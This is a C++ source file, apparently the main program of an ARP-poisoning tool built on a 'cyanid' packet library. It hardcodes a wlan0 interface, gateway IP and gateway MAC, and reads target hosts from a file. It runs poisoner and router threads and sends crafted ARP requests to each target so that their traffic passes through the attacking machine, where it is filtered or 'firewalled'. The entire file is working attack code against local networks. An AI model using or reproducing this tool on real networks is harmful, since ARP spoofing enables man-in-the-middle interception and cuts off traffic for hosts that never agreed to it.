#include "poisoner.hpp"
#include "router.hpp"
#include "basic_filter.hpp"

#include <cyanid.hpp>

#include <algorithm>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>

using namespace std;
using namespace cyanid;

void trigger_poisoning(cyanid::device&, const vector<string>&);
void read_hosts(vector<string>&, const string&);
void dump_hosts(const vector<string>&);

int main(int argc, char* argv[])
{
    using namespace std;
    using namespace cyanid;

    const string iface("wlan0");
    const string gateway_ip("192.168.1.1");
    const string gateway_mac("00:1e:2a:0b:74:16");

    vector<string> hosts;
    read_hosts(hosts, "hosts.txt");

    cout << "Starting ARP poisoning and routing on " << iface << "... ";

    device dev(iface);

    BasicFilter filter(hosts);
    thread router(Router(dev, filter));
    thread poisoner(Poisoner(dev, hosts, gateway_ip, gateway_mac));

    cout << "Done. Firewalling hosts: " << endl;

    dump_hosts(hosts);

    cout << "Requesting MAC addresses... \n" << endl;

    trigger_poisoning(dev, hosts);

    router.join();
    poisoner.join();

    return 0;
}

/**
 * Trigger ARP poisoning by sending ARP requests to the target hosts.
 */
void trigger_poisoning(cyanid::device& dev, const vector<string>& hosts)
{
    const std::string source_mac(cyanid::utils::mac_to_str(dev.get_mac()));
    const std::string source_ip(cyanid::utils::addr4_to_str(dev.get_ip()));

    for (auto it = hosts.begin(); it < hosts.end(); ++it) {
        const string target_ip(*it);

        cyanid::packet packet(dev);

        packet.build<cyanid::builder::arp>()(
                cyanid::builder::arp::REQUEST,
                source_mac,
                source_ip,
                "00:00:00:00:00:00",
                target_ip);

        packet.build<cyanid::builder::ethernet>()(
                "ff:ff:ff:ff:ff:ff",
                cyanid::builder::arp::ETHER_TYPE);

        packet.dispatch();

        cout << "Requested MAC address for " << *it << "\n\n";
    }
}

void read_hosts(vector<string>& hosts, const string& file)
{
    string line;

    fstream infile(file);
    while (getline(infile, line)) {
        if (line[0] == '#') continue;
        hosts.push_back(line);
    }
}

void dump_hosts(const vector<string>& hosts)
{
    for (auto it = hosts.begin(); it != hosts.end(); ++it) {
        cout << "<*> " << *it << endl;
    }

    cout << endl;
}
